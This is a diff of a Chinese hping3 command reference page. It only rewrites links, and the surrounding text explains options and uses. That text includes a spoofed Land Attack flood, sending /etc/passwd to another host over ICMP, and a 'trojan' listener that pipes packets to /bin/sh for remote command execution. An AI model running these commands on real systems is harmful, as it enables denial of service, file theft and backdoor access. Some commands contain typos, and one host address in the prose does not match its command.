@@ -3,54 +3,54 @@
 ### 安装  
 
 ```
-[yum](https://philipding.github.io/linux-command/yum "yum命令") [install](https://philipding.github.io/linux-command/install "install命令") libpcap-devel tc-devel
-[ln](https://philipding.github.io/linux-command/ln "ln命令") -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h
-[wget](https://philipding.github.io/linux-command/wget "wget命令") http://www.hping.org/hping3-20051105.[tar](https://philipding.github.io/linux-command/tar "tar命令").gz
+[yum](#/yum "yum命令") [install](#/install "install命令") libpcap-devel tc-devel
+[ln](#/ln "ln命令") -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h
+[wget](#/wget "wget命令") http://www.hping.org/hping3-20051105.[tar](#/tar "tar命令").gz
 tar zxvf hping3-20051105.tar.gz
-[cd](https://philipding.github.io/linux-command/cd "cd命令") hping3-20051105
+[cd](#/cd "cd命令") hping3-20051105
 ./configure
-[make](https://philipding.github.io/linux-command/make "make命令")
+[make](#/make "make命令")
 make install
 ```
 
 ### 选项  
 
 ```
--H --[help](https://philipding.github.io/linux-command/help "help命令") 显示帮助。
+-H --[help](#/help "help命令") 显示帮助。
 -v -VERSION 版本信息。
 -c --count count 发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑。
 -i --interval 包发送间隔时间（单位是毫秒）缺省时间是1秒,此功能在增加传输率上很重要,在idle/spoofing扫描时此功能也会被用到,你可以参考hping-howto获得更多信息-fast 每秒发10个数据包。
 -n -nmeric 数字输出，象征性输出主机地址。
 -q -quiet 退出。
 -I --interface interface name 无非就是eth0之类的参数。
--v --verbose 显示很多信息，TCP回应一般如：len=46 [ip](https://philipding.github.io/linux-command/ip "ip命令")=192.168.1.1 flags=RADF [seq](https://philipding.github.io/linux-command/seq "seq命令")=0 ttl=255 [id](https://philipding.github.io/linux-command/id "id命令")=0 win=0 rtt=0.4ms tos=0 iplen=40 seq=0 ack=1380893504 [sum](https://philipding.github.io/linux-command/sum "sum命令")=2010 urp=0
+-v --verbose 显示很多信息，TCP回应一般如：len=46 [ip](#/ip "ip命令")=192.168.1.1 flags=RADF [seq](#/seq "seq命令")=0 ttl=255 [id](#/id "id命令")=0 win=0 rtt=0.4ms tos=0 iplen=40 seq=0 ack=1380893504 [sum](#/sum "sum命令")=2010 urp=0
 -D --debug 进入debug模式当你遇到麻烦时，比如用HPING遇到一些不合你习惯的时候，你可以用此模式修改HPING，（INTERFACE DETECTION,DATA LINK LAYER ACCESS,INTERFACE SETTINGS,.......）
--z --[bind](https://philipding.github.io/linux-command/bind "bind命令") 快捷键的使用。
+-z --[bind](#/bind "bind命令") 快捷键的使用。
 -Z --unbind 消除快捷键。
 -O --rawip RAWIP模式，在此模式下HPING会发送带数据的IP头。
 -1 --icmp ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。
 -2 --udp UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。
 -9 --listen signatuer hping的listen模式，用此模式，HPING会接收指定的数据。
--a --spoof [hostname](https://philipding.github.io/linux-command/hostname "hostname命令") 伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。
--t --ttl [time](https://philipding.github.io/linux-command/time "time命令") to live 可以指定发出包的TTL值。
+-a --spoof [hostname](#/hostname "hostname命令") 伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。
+-t --ttl [time](#/time "time命令") to live 可以指定发出包的TTL值。
 -H --ipproto 在RAW IP模式里选择IP协议。
--[w](https://philipding.github.io/linux-command/w "w命令") --WINID UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。
+-[w](#/w "w命令") --WINID UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。
 -r --rel 更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。
 -F --FRAG 更改包的FRAG，这可以测试对方对于包碎片的处理能力，缺省的“virtual mtu”是16字节。
 -x --morefrag 此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。
 -y -dontfrag 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。
--G --fragoff fragment offset value [set](https://philipding.github.io/linux-command/set "set命令") the fragment offset
+-G --fragoff fragment offset value [set](#/set "set命令") the fragment offset
 -m --mtu mtu value 用此项后ID数值变得很大，50000没指定此项时3000-20000左右。
 -G --rroute 记录路由，可以看到详悉的数据等等，最多可以经过9个路由，即使主机屏蔽了ICMP报文。
--C --ICMPTYPE [type](https://philipding.github.io/linux-command/type "type命令") 指定ICMP类型，缺省是ICMP [echo](https://philipding.github.io/linux-command/echo "echo命令") REQUEST。
+-C --ICMPTYPE [type](#/type "type命令") 指定ICMP类型，缺省是ICMP [echo](#/echo "echo命令") REQUEST。
 -K --ICMPCODE CODE 指定ICMP代号，缺省0。
 --icmp-ipver 把IP版本也插入IP头。
 --icmp-iphlen 设置IP头的长度，缺省为5（32字节）。
 --icmp-iplen 设置IP包长度。
 --icmp-ipid 设置ICMP报文IP头的ID，缺省是RANDOM。
 --icmp-ipproto 设置协议的，缺省是TCP。
--icmp-[cksum](https://philipding.github.io/linux-command/cksum "cksum命令") 设置校验和。
--icmp-ts [alias](https://philipding.github.io/linux-command/alias "alias命令") for --icmptype 13 (to send ICMP timestamp requests)
+-icmp-[cksum](#/cksum "cksum命令") 设置校验和。
+-icmp-ts [alias](#/alias "alias命令") for --icmptype 13 (to send ICMP timestamp requests)
 --icmp-addr Alias for --icmptype 17 (to send ICMP address mask requests)
 -s --baseport source port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加1，这规则你可以自己定义。
 -p --deskport [+][+]desk port 设置目标端口，缺省为0，一个加号设置为:每发送一个请求包到达后，端口加1，两个加号为：每发一个包，端口数加1。
@@ -70,7 +70,7 @@ Hping3主要有以下典型功能应用：
 
 使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：[http://0daysecurity.com/articles/hping3_examples.html](http://0daysecurity.com/articles/hping3_examples.html)
 
-测试防火墙对ICMP包的反应、是否支持[traceroute](https://philipding.github.io/linux-command/traceroute "traceroute命令")、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。
+测试防火墙对ICMP包的反应、是否支持[traceroute](#/traceroute "traceroute命令")、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。
 
 ```
 hping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10
@@ -86,7 +86,7 @@ hping3 -I eth0  -S 192.168.10.1 -p 80
 
 其中`-I eth0`指定使用eth0端口，`-S`指定TCP包的标志位SYN，`-p 80`指定探测的目的端口。
 
-hping3支持非常丰富的端口探测方式，[nmap](https://philipding.github.io/linux-command/nmap "nmap命令")拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。
+hping3支持非常丰富的端口探测方式，[nmap](#/nmap "nmap命令")拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。
 
 #### Idle扫描  
 
@@ -117,14 +117,14 @@ hping3 192.168.1.159--listen signature --safe  --icmp
 在发送端使用签名打包的ICMP包发送文件：
 
 ```
-hping3 192.168.1.108--icmp ?d 100 --sign signature --[file](https://philipding.github.io/linux-command/file "file命令") /etc/[passwd](https://philipding.github.io/linux-command/passwd "passwd命令")
+hping3 192.168.1.108--icmp ?d 100 --sign signature --[file](#/file "file命令") /etc/[passwd](#/passwd "passwd命令")
 ```
 
 将`/etc/passwd`密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。
 
 #### 木马功能  
 
-如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与[netcat](https://philipding.github.io/linux-command/nc_netcat "netcat命令")的后门功能类似。
+如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与[netcat](#/nc_netcat "netcat命令")的后门功能类似。
 
 示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。
 
@@ -137,7 +137,7 @@ hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh
 在远程控制端：
 
 ```
-echo [ls](https://philipding.github.io/linux-command/ls "ls命令") >[test](https://philipding.github.io/linux-command/test "test命令").cmd
+echo [ls](#/ls "ls命令") >[test](#/test "test命令").cmd
 hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd
 ```
 
